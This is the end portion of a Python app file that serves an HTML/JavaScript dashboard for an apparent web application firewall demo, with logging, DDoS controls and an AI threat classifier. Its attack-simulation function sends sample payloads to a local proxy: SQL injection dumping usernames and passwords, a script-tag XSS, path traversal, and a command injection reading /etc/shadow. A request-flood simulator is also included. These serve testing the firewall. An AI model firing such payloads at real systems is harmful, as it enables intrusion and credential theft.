                            <td><strong>${log.method}</strong> ${log.path}</td>
                            <td><span class="code-payload" title="${snippet}">${snippet}</span></td>
                        </tr>
                    `;
                }).join('');
            } catch (e) {
                console.error("Failed to fetch logs", e);
            }
        }

        async function clearLogs() {
            if (confirm("Are you sure you want to clear all incident logs?")) {
                await fetch('/api/logs/clear', { method: 'POST' });
                fetchStats();
                fetchLogs();
            }
        }

        async function triggerAttack(type) {
            const proxyHost = 'http://127.0.0.1:8080';
            let url = '';
            let options = {};

            switch (type) {
                case 'sqli':
                    url = `${proxyHost}/target/search?q=' UNION SELECT 1,username,password FROM users--`;
                    break;
                case 'xss':
                    url = `${proxyHost}/target/search?q=<script>alert('AegisGuard XSS')</script>`;
                    break;
                case 'lfi':
                    url = `${proxyHost}/target/view-file?file=../../../../windows/win.ini`;
                    break;
                case 'rce':
                    url = `${proxyHost}/target/search?q=safe; whoami && cat /etc/shadow`;
                    break;
                case 'bot':
                    url = `${proxyHost}/target/search?q=admin`;
                    options = { headers: { 'User-Agent': 'sqlmap/1.7.8#stable (https://sqlmap.org)' } };
                    break;
                case 'clean':
                    url = `${proxyHost}/target/search?q=cybersecurity-waf-report`;
                    break;
            }

            try {
                const res = await fetch(url, options);
                const data = await res.json().catch(() => ({}));
                console.log(`Attack result [${type}]:`, res.status, data);
            } catch (err) {
                console.log(`Request completed or blocked:`, err);
            }

            setTimeout(() => {
                fetchStats();
                fetchLogs();
            }, 300);
        }

        async function analyzeAI() {
            const input = document.getElementById('ai-input').value;
            if (!input) return;

            try {
                const res = await fetch('/api/ai/predict', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ payload: input })
                });
                const data = await res.json();

                const pct = (data.threat_probability * 100).toFixed(1);
                document.getElementById('ai-prob-val').innerText = pct + '%';
                const bar = document.getElementById('ai-prob-bar');
                bar.style.width = pct + '%';

                const verdictEl = document.getElementById('ai-verdict-val');
                if (data.verdict === 'CRITICAL_THREAT') {
                    verdictEl.innerText = '🔴 CRITICAL THREAT';
                    verdictEl.style.color = '#ef4444';
                    bar.style.backgroundColor = '#ef4444';
                } else if (data.verdict === 'SUSPICIOUS') {
                    verdictEl.innerText = '🟡 SUSPICIOUS';
                    verdictEl.style.color = '#f59e0b';
                    bar.style.backgroundColor = '#f59e0b';
                } else {
                    verdictEl.innerText = '🟢 BENIGN / CLEAN';
                    verdictEl.style.color = '#10b981';
                    bar.style.backgroundColor = '#10b981';
                }

                document.getElementById('ai-entropy-val').innerText = data.entropy + ' bits/char';
                document.getElementById('ai-intent-val').innerText = data.detected_intent + ' (' + data.inference_time_ms + 'ms)';
            } catch (e) {
                console.error("AI analysis failed", e);
            }
        }

        function loadAiPreset(text) {
            document.getElementById('ai-input').value = text;
            analyzeAI();
        }

        async function fetchDdosStats() {
            try {
                const res = await fetch('/api/ddos/status');
                const data = await res.json();

                document.getElementById('ddos-rps').innerText = (data.global_rps || 0) + ' RPS';
                document.getElementById('ddos-challenges-issued').innerText = (data.total_challenges_issued || 0).toLocaleString();
                document.getElementById('ddos-challenges-solved').innerText = (data.total_challenges_solved || 0).toLocaleString();
                document.getElementById('ddos-dropped').innerText = (data.total_blocked_ddos || 0).toLocaleString();
                document.getElementById('ddos-jailed-count').innerText = (data.jailed_ips_count || 0);

                const badge = document.getElementById('ddos-mode-badge');
                const btn = document.getElementById('btn-toggle-attack-mode');
                if (data.under_attack_mode) {
                    badge.className = 'badge-attack';
                    badge.innerText = '🔥 UNDER ATTACK MODE (ACTIVE)';
                    btn.innerText = '🛡️ Disable Under Attack Mode';
                    btn.style.background = 'linear-gradient(135deg, #10b981, #059669)';
                } else {
                    badge.className = 'badge-normal';
                    badge.innerText = '🟢 NORMAL DEFENSE';
                    btn.innerText = '🔥 Force "Under Attack Mode"';
                    btn.style.background = 'linear-gradient(135deg, #f59e0b, #d97706)';
                }

                const jailBox = document.getElementById('jailed-ips-container');
                const jailList = document.getElementById('jailed-ips-list');
                if (data.jailed_ips && data.jailed_ips.length > 0) {
                    jailBox.style.display = 'block';
                    jailList.innerHTML = data.jailed_ips.map(j => `
                        <div class="jail-pill">
                            <span>${j.ip} (${j.remaining_seconds}s left, ${j.violations}x)</span>
                            <button class="btn-unban" onclick="unbanIp('${j.ip}')">Unban</button>
                        </div>
                    `).join('');
                } else {
                    jailBox.style.display = 'none';
                }
            } catch (e) {
                console.error("DDoS stats fetch failed", e);
            }
        }

        async function toggleUnderAttackMode() {
            try {
                await fetch('/api/ddos/toggle', { method: 'POST' });
                await fetchDdosStats();
            } catch (e) {
                console.error("Failed to toggle attack mode", e);
            }
        }

        async function unbanIp(ip) {
            try {
                await fetch('/api/ddos/unban?ip=' + encodeURIComponent(ip), { method: 'POST' });
                await fetchDdosStats();
            } catch (e) {
                console.error("Failed to unban IP", e);
            }
        }

        async function triggerDdosFlood() {
            const proxyHost = 'http://127.0.0.1:8080';
            const burstCount = 80;
            console.log(`[DDoS Simulator] Launching burst of ${burstCount} rapid requests...`);
            
            const reqs = [];
            for (let i = 0; i < burstCount; i++) {
                reqs.push(fetch(`${proxyHost}/target/search?flood_id=${i}`, {
                    headers: { 'X-Bot-Flood': '1' }
                }).catch(() => ({})));
            }
            await Promise.allSettled(reqs);
            fetchDdosStats();
            fetchStats();
            fetchLogs();
        }

        // Run initial AI analysis on default preset
        setTimeout(analyzeAI, 500);

        initChart();
        fetchStats();
        fetchLogs();
        fetchDdosStats();
        setInterval(() => {
            fetchStats();
            fetchLogs();
            fetchDdosStats();
        }, 2000);
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="127.0.0.1", port=9000, reload=True)
